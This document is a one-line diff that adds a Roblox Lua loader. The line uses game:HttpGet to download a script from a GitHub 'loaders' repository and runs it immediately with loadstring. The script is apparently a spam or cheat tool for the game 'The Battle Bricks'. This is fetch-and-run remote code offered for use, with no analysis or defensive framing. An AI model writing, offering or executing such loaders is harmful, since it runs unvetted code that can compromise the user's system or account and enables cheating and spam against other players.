@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/the-battle-bricks-spam3-wbol3co2mfodh2.lua"))()
